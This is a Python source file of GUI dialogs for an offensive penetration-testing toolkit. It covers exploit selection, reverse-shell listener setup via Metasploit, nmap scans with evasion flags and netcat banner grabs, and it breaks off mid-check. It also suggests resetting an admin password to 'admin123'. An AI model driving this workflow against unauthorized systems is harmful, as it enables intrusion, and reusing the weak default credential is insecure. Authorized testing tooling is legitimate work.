# HAWK — Hostile Assessment War-Kit
# Copyright 2026 Lorenzo Serafini
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# A copy of the License is provided in the LICENSE file at the root
# of this distribution, or at http://www.apache.org/licenses/LICENSE-2.0
#
# Attribution "Created by Lorenzo Serafini" must be preserved in all
# redistributed and Derivative Works — see NOTICE for details.

"""
HAWK - Dialogs v1.0
- Greenbone install: 10-second countdown popup watching xterm for password
- Selectable text: CTkTextbox (disabled) for all technical content
- OS detection dialog fixed (grab_set)
- Netcat with service-specific verification commands
"""

import os
import re
import time
import threading
import subprocess
import shlex
import json
import tempfile
import shutil
import socket
import pathlib
import urllib.request

from gui.dialogs_common import *

class GreenboneCountdownDialog:
    """
    10-second countdown shown when Greenbone xterm install starts.
    Tells user to watch xterm for admin password.
    Auto-closes after countdown.
    """

    def __init__(self, parent):
        self._seconds = 10
        win = self._win = ctk.CTkToplevel(parent)
        # Hide until layout settles (see comment in gui/dialogs._make_win)
        win.withdraw()
        win.title("Greenbone — Installing")
        win.geometry("480x260")
        win.resizable(False, False)
        win.configure(fg_color=COLORS["bg_primary"])
        win.update_idletasks()
        sw, sh = win.winfo_screenwidth(), win.winfo_screenheight()
        win.geometry(f"480x260+{(sw-480)//2}+{(sh-260)//2}")

        def _reveal():
            try:
                if win.winfo_exists():
                    win.deiconify(); win.lift(); win.focus_force()
            except Exception:
                pass
        win.after(250, _reveal)

        ctk.CTkFrame(win, fg_color=COLORS["text_yellow"],
                     height=2, corner_radius=0).pack(fill="x")

        ctk.CTkLabel(win, text="⚠  Greenbone Installation Starting",
                     font=_f("xl", True),
                     text_color=COLORS["text_yellow"]).pack(pady=(16, 8))

        ctk.CTkLabel(win,
                     text="Watch the xterm terminal window!\n\n"
                          "The admin password will appear during setup.\n"
                          "Note it down — you will need it to log in.",
                     font=_f("lg"),
                     text_color=COLORS["text_bright"],
                     justify="center").pack(pady=4)

        ctk.CTkLabel(win,
                     text="To reset password later:\n"
                          "sudo runuser -u _gvm -- gvmd --user=admin --new-password=admin123",
                     font=_f("sm"),
                     text_color=COLORS["text_muted"],
                     justify="center").pack(pady=6)

        self._countdown_lbl = ctk.CTkLabel(
            win, text=f"This dialog closes in:  {self._seconds}...",
            font=_f("md"), text_color=COLORS["text_dim"])
        self._countdown_lbl.pack(pady=8)

        win.after(1000, self._tick)

    def _tick(self):
        self._seconds -= 1
        try:
            if self._seconds <= 0:
                _safe_destroy(self._win)
                return
            self._countdown_lbl.configure(
                text=f"This dialog closes in:  {self._seconds}...")
            self._win.after(1000, self._tick)
        except Exception:
            pass


class NonStandardPortDialog:
    def __init__(self, parent, service: str, port: int, target: str,
                 app, callback_netcat=None, callback_ignore=None):
        win = _make_win(parent, f"Non-Standard Port — {port}", 620, 500)
        _title(win, f"⚠  Possible {service.upper()} on Port {port}")

        from utils.config import SERVICE_PORT_MAP
        default = SERVICE_PORT_MAP.get(service.lower(), "?")
        _note_box(win,
                  f"nmap detected '{service}' on port {port} "
                  f"(default: {default}).",
                  COLORS["text_yellow"])

        # Service hint
        svc_info = _get_service_info(service)
        ctk.CTkLabel(win, text=f"  💡 {svc_info['hint']}",
                     font=_f("md"), text_color=COLORS["text_green"],
                     anchor="w").pack(fill="x", padx=24, pady=(4, 2))

        # Verification commands — selectable text
        cmds_fr = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                               border_color=COLORS["border_dim"],
                               border_width=1, corner_radius=4)
        cmds_fr.pack(fill="x", padx=24, pady=6)
        ctk.CTkLabel(cmds_fr,
                     text="  Verification commands (click to select and copy):",
                     font=_f("sm", True), text_color=COLORS["text_bright"],
                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))

        # Resolve xfreerdp → xfreerdp3/2 (whichever is installed)
        # and substitute version-aware TLS/security flags
        from modules.base import _resolve_freerdp, _rdp_compat_flags
        _rdp_bin = _resolve_freerdp()
        _rdp_fl  = _rdp_compat_flags()
        cmds_text = "\n".join(
            f"{label}:\n  {cmd.replace('xfreerdp', _rdp_bin, 1).replace('{rdp_flags}', _rdp_fl).replace('{target}', target).replace('{port}', str(port))}"
            for label, cmd in svc_info["commands"][:3]
        )
        box = ctk.CTkTextbox(
            cmds_fr, height=120, font=_f("md"),
            fg_color=COLORS["bg_secondary"],
            text_color=COLORS["text_cyan"],
            border_width=0, corner_radius=0)
        box.pack(fill="x", padx=8, pady=(0, 8))
        box.insert("1.0", cmds_text)
        box.configure(state="disabled")

        nc_cmd = f"nc -nv {target} {port}"
        ctk.CTkLabel(win, text="  Quick banner grab:",
                     font=_f("sm", True), text_color=COLORS["text_dim"],
                     anchor="w").pack(fill="x", padx=24, pady=(4, 2))
        _selectable_text(win, nc_cmd, color=COLORS["text_cyan"], height=32)

        _recommended(win, f"Open netcat in xterm to verify port {port}")

        # Named handlers instead of inline lambdas — the old form built
        # a LIST `[_safe_destroy(win), callback_netcat(...)]` to execute
        # two statements in one expression.  That works for OPEN / DEEP
        # SCAN but the IGNORE handler used a bare lambda that — on some
        # CTk+Tk combinations (observed on Kali 2025) — failed to actually
        # close the window when `grab_set()` had fired but wait_visibility
        # hadn't completed.  The named function below is resilient: it
        # tries grab_release/destroy twice and always invokes the ignore
        # callback so the parent can record the dismissal regardless.
        def _on_netcat():
            _safe_destroy(win)
            if callback_netcat:
                try:
                    callback_netcat(nc_cmd, port, service)
                except Exception as e:
                    import sys as _s
                    print(f"[HAWK] NonStandardPortDialog netcat cb: {e}",
                          file=_s.stderr)

        def _on_deep_scan():
            _safe_destroy(win)
            if callback_netcat:
                try:
                    callback_netcat(
                        f"nmap -Pn -sV -p {port} {target}", port, service)
                except Exception as e:
                    import sys as _s
                    print(f"[HAWK] NonStandardPortDialog deep-scan cb: {e}",
                          file=_s.stderr)

        def _on_ignore():
            # Belt-and-suspenders close: release any modal grab first,
            # schedule an extra destroy tick via after() in case the
            # synchronous destroy races with Tk's event queue.
            try:
                win.grab_release()
            except Exception:
                pass
            try:
                win.destroy()
            except Exception:
                pass
            try:
                win.after(10, lambda: win.winfo_exists()
                          and win.destroy())
            except Exception:
                pass
            # Always notify parent, even if the close itself threw —
            # the dismissal semantics (no re-prompt this session) matter
            # more than the window actually going away cleanly.
            if callback_ignore:
                try:
                    callback_ignore()
                except Exception as e:
                    import sys as _s
                    print(f"[HAWK] NonStandardPortDialog ignore cb: {e}",
                          file=_s.stderr)

        row = _btn_row(win)
        _btn(row, "OPEN NETCAT (xterm)", _on_netcat, primary=True, w=190)
        _btn(row, "DEEP SCAN PORT",      _on_deep_scan,                w=160)
        _btn(row, "IGNORE",              _on_ignore)


class LhostDialog:
    def __init__(self, parent, callback=None):
        from utils.runner import lhost_candidates
        self._callback = callback
        candidates     = lhost_candidates()
        detected_ip    = candidates[0]["ip"] if candidates else ""
        detected_iface = candidates[0]["iface"] if candidates else "unknown"

        win = _make_win(parent, "Set LHOST / LPORT", 540, 380)
        _title(win, "Reverse Shell Configuration")

        if detected_ip:
            _note_box(win,
                      f"★ Auto-detected LHOST: {detected_ip}\n"
                      f"   Interface: {detected_iface}\n\n"
                      f"   Priority: VPN/overlay first, then VM lab NIC.\n"
                      f"   VM NICs include eth*, ens*, enp*, eno*.",
                      COLORS["text_green"])
        else:
            _note_box(win,
                      "⚠  Could not auto-detect IP. Enter manually.",
                      COLORS["text_yellow"])

        _sub(win, "LHOST (your Kali IP):")
        self._lhost_var = ctk.StringVar(value=detected_ip)
        ctk.CTkEntry(win, textvariable=self._lhost_var,
                     font=_f("lg"), height=36,
                     fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
                     border_color=COLORS["border_green"], border_width=1,
                     corner_radius=3).pack(fill="x", padx=24, pady=4)

        _sub(win, "LPORT (listener port):")
        # Auto-select free port
        from utils.runner import find_free_port, is_port_free
        free_port = find_free_port(4444)
        self._lport_var = ctk.StringVar(value=str(free_port))

        self._lport_entry = ctk.CTkEntry(win, textvariable=self._lport_var,
                     font=_f("lg"), height=36,
                     fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
                     border_color=COLORS["border_green"], border_width=1,
                     corner_radius=3)
        self._lport_entry.pack(fill="x", padx=24, pady=4)
        add_context_menu(self._lport_entry)

        if free_port != 4444:
            ctk.CTkLabel(win,
                         text=f"  ⚠ Port 4444 is in use — using {free_port} instead.",
                         font=_f("sm"), text_color=COLORS["text_yellow"],
                         anchor="w").pack(fill="x", padx=24, pady=(0,4))

        self._port_warn_lbl = ctk.CTkLabel(win, text="",
                                            font=_f("sm"),
                                            text_color=COLORS["text_red"],
                                            anchor="w")
        self._port_warn_lbl.pack(fill="x", padx=24)

        def _check_port(*_):
            try:
                p = int(self._lport_var.get())
                if is_port_free(p):
                    self._lport_entry.configure(border_color=COLORS["border_green"])
                    self._port_warn_lbl.configure(text="")
                else:
                    self._lport_entry.configure(border_color=COLORS["text_red"])
                    suggested = find_free_port(p+1)
                    self._port_warn_lbl.configure(
                        text=f"  ⚠ Port {p} is in use! "
                             f"Exploit WILL FAIL. Suggested: {suggested}")
            except ValueError:
                pass

        self._lport_var.trace_add("write", _check_port)

        _note_box(win,
                  "HAWK will:\n"
                  "  1. Start multi/handler listener in xterm (stays open)\n"
                  "  2. Run exploit — interact with session automatically",
                  COLORS["text_muted"])

        row = _btn_row(win)
        _btn(row, "CONFIRM & LAUNCH", self._confirm, primary=True, w=180)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))
        self._win = win

    def _confirm(self):
        """Validate LPORT is free before calling back.

        If the port is occupied we STOP the launch and show a blocking
        dialog so the user either types a new port or accepts the
        suggested free one — no silent substitution.
        """
        from utils.runner import is_port_free, find_free_port
        lhost = self._lhost_var.get().strip()
        lport_raw = self._lport_var.get().strip() or "4444"

        # Validate the port is a number
        try:
            lport_int = int(lport_raw)
            if not (1 <= lport_int <= 65535):
                raise ValueError
        except ValueError:
            self._port_warn_lbl.configure(
                text=f"  ⚠ '{lport_raw}' is not a valid port number.")
            return

        # ── Occupied port: block and ask the user ────────────────────
        if not is_port_free(lport_int):
            suggested = find_free_port(lport_int + 1)
            self._show_port_conflict_dialog(lport_int, suggested, lhost)
            return

        _safe_destroy(self._win)
        if self._callback:
            self._callback(lhost, str(lport_int))

    def _show_port_conflict_dialog(self, busy_port: int,
                                    suggested: int, lhost: str):
        """Explicit warning dialog shown when the chosen LPORT is busy."""
        from utils.runner import is_port_free, find_free_port
        popup = _make_win(self._win, "LPORT in use", 520, 380)
        _title(popup, "⚠  LPORT already in use")
        _note_box(popup,
                  f"Port {busy_port} on this machine is already bound by\n"
                  f"another process (likely a previous msfconsole handler\n"
                  f"that didn't shut down cleanly).\n\n"
                  f"Starting the exploit with this port would fail with\n"
                  f"'Handler failed to bind' and the reverse shell would\n"
                  f"never connect back.",
                  COLORS["text_red"])
        _note_box(popup,
                  f"Suggested free port:  {suggested}\n\n"
                  f"You can:\n"
                  f"  • Use the suggested port (recommended).\n"
                  f"  • Type a different port below and re-check.\n"
                  f"  • Kill the stale listener:\n"
                  f"      sudo lsof -i:{busy_port}\n"
                  f"      sudo kill -9 <PID>",
                  COLORS["border_dim"])

        alt_var = ctk.StringVar(value=str(suggested))
        entry = ctk.CTkEntry(popup, textvariable=alt_var,
                             font=_f("lg"), height=34,
                             fg_color=COLORS["bg_card"],
                             text_color=COLORS["text_bright"],
                             border_color=COLORS["border_green"],
                             border_width=1, corner_radius=3)
        entry.pack(fill="x", padx=24, pady=4)
        add_context_menu(entry)

        def _use_suggested():
            self._lport_var.set(str(suggested))
            _safe_destroy(popup)
            _safe_destroy(self._win)
            if self._callback:
                self._callback(lhost, str(suggested))

        def _use_typed():
            raw = alt_var.get().strip()
            try:
                p = int(raw)
                assert 1 <= p <= 65535
            except (ValueError, AssertionError):
                return
            if not is_port_free(p):
                # Still busy — loop back with a new suggestion
                _safe_destroy(popup)
                self._lport_var.set(str(p))
                self._show_port_conflict_dialog(p, find_free_port(p + 1),
                                                lhost)
                return
            self._lport_var.set(str(p))
            _safe_destroy(popup)
            _safe_destroy(self._win)
            if self._callback:
                self._callback(lhost, str(p))

        row = _btn_row(popup)
        _btn(row, f"USE {suggested}", _use_suggested, primary=True, w=140)
        _btn(row, "USE TYPED PORT",  _use_typed, w=160)
        _btn(row, "CANCEL", lambda: _safe_destroy(popup))


class ExploitSelectorDialog:
    def __init__(self, parent, fp, exploits: list, target: str, callback=None):
        self._fp = fp; self._exploits = exploits
        self._target = target; self._callback = callback; self._checks = {}
        h = min(700, 220 + len(exploits) * 50)
        win = _make_win(parent, "Exploit Selector", 760, h)
        _title(win, "Available Exploits  —  Select to Run")
        open_ports = ", ".join(str(p) for p, _, _, _ in fp.open_ports[:10])
        _note_box(win,
                  f"Target: {target}  |  OS: {fp.summary()}\n"
                  f"Open ports: {open_ports}", COLORS["text_green"])
        ctrl = ctk.CTkFrame(win, fg_color="transparent")
        ctrl.pack(fill="x", padx=24, pady=4)
        _btn(ctrl, "SELECT ALL",  self._select_all,  w=120)
        _btn(ctrl, "SELECT NONE", self._select_none, w=120)
        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        scroll.pack(fill="both", expand=True, padx=16, pady=8)
        rank_colors = {"excellent": COLORS["text_red"], "great": COLORS["text_yellow"],
                       "good": COLORS["text_green"], "normal": COLORS["text_dim"]}
        self._check_vars = []
        for idx, exploit in enumerate(exploits):
            var = ctk.BooleanVar(value=(exploit.rank.lower() in ("excellent","great")))
            self._check_vars.append(var); self._checks[idx] = var
            fr = ctk.CTkFrame(scroll, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=3)
            fr.pack(fill="x", padx=6, pady=3)
            top = ctk.CTkFrame(fr, fg_color="transparent")
            top.pack(fill="x", padx=8, pady=(6,2))
            ctk.CTkCheckBox(top, text=exploit.name, variable=var,
                            font=_f("md",True), text_color=COLORS["text_bright"],
                            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                            checkmark_color=COLORS["bg_primary"], width=20, height=20,
                            ).pack(side="left")
            rcolor = rank_colors.get(exploit.rank.lower(), COLORS["text_dim"])
            ctk.CTkLabel(top, text=f"  [{exploit.rank.upper()}]",
                         font=_f("sm",True), text_color=rcolor).pack(side="left", padx=8)
            if exploit.cve:
                ctk.CTkLabel(top, text=exploit.cve, font=_f("sm"),
                             text_color=COLORS["text_yellow"]).pack(side="left")
            ctk.CTkLabel(fr, text=f"  {exploit.description}",
                         font=_f("sm"), text_color=COLORS["text_dim"],
                         wraplength=680, justify="left", anchor="w",
                         ).pack(fill="x", padx=28, pady=(0,6))
        _divider(win)
        row = _btn_row(win)
        _btn(row, "RUN SELECTED", self._confirm, primary=True, w=150)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))
        self._win = win

    def _select_all(self):
        for v in self._check_vars: v.set(True)

    def _select_none(self):
        for v in self._check_vars: v.set(False)

    def _confirm(self):
        selected = [self._exploits[i] for i,var in self._checks.items() if var.get()]
        _safe_destroy(self._win)
        if self._callback and selected: self._callback(selected)


class OsAmbiguousDialog:
    def __init__(self, parent, fp, target: str,
                 callback_disambig=None, callback_proceed=None):
        from modules.exploit_suggester import OS_DISAMBIG_TESTS
        self._target = target; self._callback_disambig = callback_disambig
        self._callback_proceed = callback_proceed; self._test_vars = {}
        win = _make_win(parent, "OS Detection Ambiguous", 600, 480)
        _title(win, "⚠  OS Detection Uncertain")
        candidates = "\n".join(f"  • {c}" for c in fp.os_candidates[:4])
        _note_box(win,
                  f"Multiple OS candidates:\n\n{candidates}\n\n"
                  f"Confidence: {fp.confidence}%", COLORS["text_yellow"])
        _sub(win, "Select disambiguation tests:")
        for key, test in OS_DISAMBIG_TESTS.items():
            var = ctk.BooleanVar(value=test["recommended"])
            self._test_vars[key] = (var, test)
            fr = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
                              border_color=COLORS["border_dim"],
                              border_width=1, corner_radius=3)
            fr.pack(fill="x", padx=24, pady=3)
            top = ctk.CTkFrame(fr, fg_color="transparent")
            top.pack(fill="x", padx=8, pady=(6,2))
            ctk.CTkCheckBox(top, text=test["desc"], variable=var,
                            font=_f("md",True), text_color=COLORS["text_bright"],
                            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                            checkmark_color=COLORS["bg_primary"], width=20, height=20,
                            ).pack(side="left")
            if test["recommended"]:
                ctk.CTkLabel(top, text="  ★", font=_f("sm"),
                             text_color=COLORS["text_green"]).pack(side="left")
            ctk.CTkLabel(fr,
                         text=f"  $ {test['cmd'].replace('{target}',target)[:80]}",
                         font=_f("sm"), text_color=COLORS["text_muted"], anchor="w",
                         ).pack(fill="x", padx=28, pady=(0,6))
        _recommended(win, "Run tests before selecting exploits")
        row = _btn_row(win)
        _btn(row, "RUN SELECTED", self._run_tests, primary=True, w=160)
        _btn(row, "PROCEED ANYWAY",
             lambda: [_safe_destroy(win), callback_proceed and callback_proceed()], w=160)
        _btn(row, "CANCEL", lambda: _safe_destroy(win))
        self._win = win

    def _run_tests(self):
        selected = {k: t for k,(v,t) in self._test_vars.items() if v.get()}
        _safe_destroy(self._win)
        if self._callback_disambig: self._callback_disambig(selected)


class AccessGateDialog:
    def __init__(self, parent, phase_name: str,
                 callback_go_exploit=None, callback_add_creds=None,
                 callback_proceed=None):
        win = _make_win(parent, "No Access to Target", 580, 380)
        ctk.CTkLabel(win, text="🔒  NO ACCESS TO TARGET",
                     font=_f("xxl", True),
                     text_color=COLORS["text_red"]).pack(pady=(16, 6))
        _note_box(win,
                  f"You are trying to run  {phase_name}  but HAWK has no "
                  f"record of successful access.\n\n"
                  f"Required:\n"
                  f"  • An active shell from Exploitation phase\n"
                  f"  • Valid credentials in the Credential Store",
                  COLORS["text_red"])
        _recommended(win, "Go to Exploitation phase first")
        row = _btn_row(win)
        _btn(row, "GO TO EXPLOITATION",
             lambda: [_safe_destroy(win), callback_go_exploit and callback_go_exploit()],
             primary=True, w=190)
        _btn(row, "ADD CREDENTIALS",
             lambda: [_safe_destroy(win), callback_add_creds and callback_add_creds()], w=160)
        _btn(row, "PROCEED ANYWAY *",
             lambda: [_safe_destroy(win), callback_proceed and callback_proceed()],
             warn=True, w=160)
        ctk.CTkLabel(win, text="* Proceeding without access will likely fail.",
                     font=_f("sm"), text_color=COLORS["text_muted"]).pack(pady=4)


class PermissionDialog:
    def __init__(self, parent, tool, phase_config: dict,
                 callback_yes=None, callback_no=None):
        win = _make_win(parent, "Confirm Action", 560, 360)
        tool_name = tool.name if tool else phase_config.get("name", "Phase")
        _title(win, f"Run  {tool_name}?")
        if tool:
            _selectable_text(win, tool.cmd_template,
                             color=COLORS["text_cyan"], height=32)
        note = phase_config.get("network_note", "")
        if note:
            _note_box(win, f"⚠  Network:  {note}", COLORS["text_yellow"])
        if tool and tool.requires_sudo:
            _note_box(win, "⚠  Requires sudo / root.", COLORS["text_yellow"])
        _recommended(win)
        row = _btn_row(win)
        _btn(row, "PROCEED",
             lambda: [_safe_destroy(win), callback_yes and callback_yes()],
             primary=True)
        _btn(row, "CANCEL",
             lambda: [_safe_destroy(win), callback_no and callback_no()])


class NmapCustomDialog:
    def __init__(self, parent, tool, callback=None):
        self._tool = tool; self._callback = callback
        self._scan_vars = {}; self._evasion_vars = {}; self._extra_vars = {}
        self._timing_var   = ctk.StringVar(value="-T3")
        self._scope_var    = ctk.StringVar(value="Top 1000 (default, ~2min)")
        self._custom_ports = ctk.StringVar(value="")
        self._custom_extra = ctk.StringVar(value="")
        self._preview_var  = ctk.StringVar(value="nmap -Pn [options] {target}")

        win = _make_win(parent, "nmap — Custom Scan Builder", 760, 720)
        self._win = win

        # ── BOTTOM BAR — bulletproof layout ──────────────────────────────
        # KEY: pack the bottom bar DIRECTLY on `win` (not inside a body
        # frame) with a FIXED height and side="bottom" BEFORE any other
        # widget. This guarantees tkinter reserves the bottom strip first,
        # so the scroll area that follows can only consume the remaining
        # space — the buttons cannot be pushed off screen even on small
        # displays where _autofit clips the window height.
        BOTTOM_H = 130
        self._bottom_bar = ctk.CTkFrame(
            win, fg_color=COLORS["bg_primary"], height=BOTTOM_H)
        self._bottom_bar.pack(side="bottom", fill="x")
        self._bottom_bar.pack_propagate(False)   # lock the height

        # Inside the bar we use grid for deterministic layout:
        #   row 0 = preview line
        #   row 1 = yellow warning note
        #   row 2 = BUILD & RUN / CANCEL buttons
        bar = self._bottom_bar
        bar.grid_columnconfigure(0, weight=1)

        ctk.CTkLabel(
            bar, textvariable=self._preview_var,
            font=_f("sm"), text_color=COLORS["text_cyan"],
            anchor="w"
        ).grid(row=0, column=0, sticky="ew", padx=24, pady=(6, 2))

        note_fr = ctk.CTkFrame(
            bar, fg_color=COLORS["bg_card"],
            border_color=COLORS["text_yellow"],
            border_width=1, corner_radius=4)
        note_fr.grid(row=1, column=0, sticky="ew", padx=24, pady=2)
        ctk.CTkLabel(
            note_fr,
            text="⚠  -Pn always included. High speed (-T4/-T5) is noisy.",
            font=_f("sm"), text_color=COLORS["text_yellow"],
            anchor="w"
        ).pack(fill="x", padx=10, pady=4)

        btn_row = ctk.CTkFrame(bar, fg_color="transparent")
        btn_row.grid(row=2, column=0, pady=(4, 6))
        _btn(btn_row, "BUILD & RUN", self._confirm, primary=True)
        _btn(btn_row, "CANCEL", lambda: _safe_destroy(win))

        # ── HEADER (on win, not inside body) ─────────────────────────────
        ctk.CTkLabel(win, text="nmap  —  Custom Scan Builder",
                     font=_f("xl", True),
                     text_color=COLORS["text_bright"]).pack(pady=(14, 4))
        ctk.CTkLabel(win,
                     text="All options build the final command. -Pn always included.",
                     font=_f("md"), text_color=COLORS["text_dim"],
                     wraplength=520, justify="center").pack(pady=(0, 4))

        # ── SCROLL fills everything between header and pinned bottom ────
        scroll = ctk.CTkScrollableFrame(
            win, fg_color=COLORS["bg_secondary"],
            scrollbar_button_color=COLORS["border_dim"],
            scrollbar_button_hover_color=COLORS["border_green"])
        scroll.pack(side="top", fill="both", expand=True, padx=16, pady=8)
        scroll.grid_columnconfigure(0, weight=1)
        scroll.grid_columnconfigure(1, weight=1)
        left  = ctk.CTkFrame(scroll, fg_color="transparent")
        left.grid(row=0, column=0, sticky="nsew", padx=6, pady=4)
        right = ctk.CTkFrame(scroll, fg_color="transparent")
        right.grid(row=0, column=1, sticky="nsew", padx=6, pady=4)

        self._section(left, "Scan Type")
        for name, cfg in NMAP_SCAN_TYPES.items():
            var = ctk.BooleanVar(value=False)
            self._scan_vars[cfg["flag"]] = var
            rf = ctk.CTkFrame(left, fg_color="transparent")
            rf.pack(anchor="w", pady=2)
            ctk.CTkCheckBox(rf, text=name, variable=var,
                            font=_f("md",True), text_color=COLORS["text_bright"],
                            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                            checkmark_color=COLORS["bg_primary"], width=20, height=20,
                            ).pack(side="left")
            ctk.CTkLabel(rf, text=f"  {cfg['desc']}", font=_f("sm"),
                         text_color=COLORS["text_dim"]).pack(side="left", padx=6)

        self._section(left, "Timing")
        for label, flag in NMAP_TIMING.items():
            rf = ctk.CTkFrame(left, fg_color="transparent")
            rf.pack(anchor="w", pady=2)
            ctk.CTkRadioButton(rf, text=label, variable=self._timing_var, value=flag,
                               font=_f("md"), text_color=COLORS["text_dim"],
                               fg_color=COLORS["border_green"],
                               border_color=COLORS["border_dim"]).pack(side="left")
            if flag == "-T3":
                ctk.CTkLabel(rf, text="  ★", font=_f("sm"),
                             text_color=COLORS["text_green"]).pack(side="left")

        self._section(right, "Port Scope")
        for label in NMAP_PORT_SCOPES:
            rf = ctk.CTkFrame(right, fg_color="transparent")
            rf.pack(anchor="w", pady=2)
            ctk.CTkRadioButton(rf, text=label, variable=self._scope_var, value=label,
                               font=_f("md"), text_color=COLORS["text_dim"],
                               fg_color=COLORS["border_green"],
                               border_color=COLORS["border_dim"]).pack(side="left")
        ctk.CTkEntry(right, textvariable=self._custom_ports,
                     placeholder_text="Custom: e.g. 22,80,443,8080-8090",
                     font=_f("md"), height=32,
                     fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
                     border_color=COLORS["border_dim"], border_width=1,
                     placeholder_text_color=COLORS["text_muted"], corner_radius=3,
                     ).pack(fill="x", padx=4, pady=4)

        self._section(right, "Evasion Techniques")
        for name, flag in NMAP_EVASION.items():
            var = ctk.BooleanVar(value=False)
            self._evasion_vars[flag] = var
            ctk.CTkCheckBox(right, text=name, variable=var,
                            font=_f("md"), text_color=COLORS["text_dim"],
                            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                            checkmark_color=COLORS["bg_primary"], width=20, height=20,
                            ).pack(anchor="w", pady=2)

        self._section(right, "Extra Flags")
        for flag, desc in NMAP_EXTRA_FLAGS.items():
            var = ctk.BooleanVar(value=False)
            self._extra_vars[flag] = var
            rf = ctk.CTkFrame(right, fg_color="transparent")
            rf.pack(anchor="w", pady=2)
            ctk.CTkCheckBox(rf, text=flag, variable=var,
                            font=_f("sm",True), text_color=COLORS["text_bright"],
                            fg_color=COLORS["border_green"], border_color=COLORS["border_dim"],
                            checkmark_color=COLORS["bg_primary"], width=18, height=18,
                            ).pack(side="left")
            ctk.CTkLabel(rf, text=f"  — {desc}", font=_f("sm"),
                         text_color=COLORS["text_dim"]).pack(side="left", padx=4)

        self._section(right, "Free-form flags")
        ctk.CTkEntry(right, textvariable=self._custom_extra,
                     placeholder_text="Any other flags, e.g. --script smb-vuln-*",
                     font=_f("md"), height=32,
                     fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
                     border_color=COLORS["border_dim"], border_width=1,
                     placeholder_text_color=COLORS["text_muted"], corner_radius=3,
                     ).pack(fill="x", padx=4, pady=4)

        # ── Direct-command section (full-width, below the 2-column grid) ──
        # IMPORTANT: `scroll` already has grid-managed children (left+right
        # in row=0).  Tk forbids mixing grid and pack on the same parent,
        # so we wrap the whole direct-command block in a dedicated frame
        # and grid IT into row=1 with columnspan=2.  Inside the wrapper
        # we use pack freely.  This used to be a silent UX bug — the
        # block raised TclError at __init__ time and the dialog rendered
        # half-built, which is why the operator never saw a "type your
        # own command" field.
        direct_box = ctk.CTkFrame(scroll, fg_color="transparent")
        direct_box.grid(row=1, column=0, columnspan=2,
                        sticky="ew", padx=6, pady=(8, 4))

        ctk.CTkLabel(
            direct_box,
            text="OR — Type command directly (overrides all options above)",
            font=_f("lg", True),
            text_color=COLORS["text_green"],
        ).pack(anchor="w", pady=(4, 4))
        ctk.CTkLabel(
            direct_box,
            text="  ⚠  If you type here, ALL options above are IGNORED. "
                 "-Pn will NOT be added automatically.",
            font=_f("sm"), text_color=COLORS["text_yellow"],
            wraplength=680, justify="left", anchor="w",
        ).pack(anchor="w", pady=(0, 4))
        self._direct_cmd = ctk.StringVar(value="")
        direct_entry = ctk.CTkEntry(
            direct_box, textvariable=self._direct_cmd,
            placeholder_text="e.g. nmap -sV -p 80,443 --script http-title",
            font=_f("md"), height=34,
            fg_color=COLORS["bg_card"], text_color=COLORS["text_bright"],
            border_color=COLORS["text_yellow"], border_width=1,
            placeholder_text_color=COLORS["text_muted"], corner_radius=3)
        direct_entry.pack(fill="x", padx=4, pady=(0, 8))
        add_context_menu(direct_entry)

        # Bottom bar is already built above (preview + note + buttons with
        # grid). Wire up live preview updates.
        self._timing_var.trace_add("write", lambda *_: self._update_preview())
        self._scope_var.trace_add("write",  lambda *_: self._update_preview())
        self._update_preview()

    def _section(self, parent, text):
        ctk.CTkLabel(parent, text=text, font=_f("lg", True),
                     text_color=COLORS["text_green"]).pack(anchor="w", pady=(12, 4))

    def _build_flags(self):
        parts = ["-Pn"]
        for flag, var in self._scan_vars.items():
            if var.get(): parts.append(flag)
        parts.append(self._timing_var.get())
        scope_label = self._scope_var.get()
        scope_flag  = NMAP_PORT_SCOPES.get(scope_label, "")
        if scope_label == "Custom (enter below)":
            custom = self._custom_ports.get().strip()
            if custom: parts.append(f"-p {custom}")
        elif scope_flag and scope_flag != "CUSTOM":
            parts.append(scope_flag)
        for flag, var in self._evasion_vars.items():
            if var.get(): parts.append(flag)
        for flag, var in self._extra_vars.items():
            if var.get(): parts.append(flag)
        extra = self._custom_extra.get().strip()
        if extra: parts.append(extra)
        return " ".join(parts)

    def _update_preview(self):
        self._preview_var.set(f"$ nmap {self._build_flags()} {{target}}")

    # ─── Flag sanity check ───────────────────────────────────────────────
    # Before firing the scan, look for flag combinations that nmap either
    # silently mangles or that produce results so noisy / slow / filtered
    # they're effectively useless. Each issue is a tuple
    #   (severity, title, detail)
    # where severity ∈ {"error", "warn", "info"}.  We show these in a
    # confirmation dialog before launching.

    def _check_flag_conflicts(self, flags: str):
        issues = []
        tokens = flags.split()
        has = lambda f: f in tokens
        low  = flags.lower()

        # 1) TCP scan-type conflicts ──────────────────────────────────────
        tcp_types = [t for t in ("-sS", "-sT", "-sA", "-sF", "-sN", "-sX")
                     if has(t)]
        if len(tcp_types) >= 2:
            issues.append((
                "error",
                f"Conflicting TCP scan types: {' + '.join(tcp_types)}",
                "Only one TCP scan mode at a time. nmap will silently pick\n"
                "the LAST one you passed and ignore the others — the flags\n"
                "you selected earlier do nothing. Pick one:\n"
                "   -sS  (SYN, stealthy, needs root)\n"
                "   -sT  (full connect, no root)\n"
                "   -sA  (ACK, firewall mapping — not open/closed)\n"
                "   -sF/-sN/-sX  (stealth probes, bypass some FW)"))

        # ACK scan cannot find open ports — just firewall state.
        if has("-sA") and not any(t in tokens for t in
                                   ("-sS", "-sT", "-sU", "-sV")):
            issues.append((
                "warn",
                "-sA alone will never show open ports",
                "ACK scan maps firewall rules (filtered vs unfiltered).\n"
                "It cannot distinguish open from closed. Combine with -sS\n"
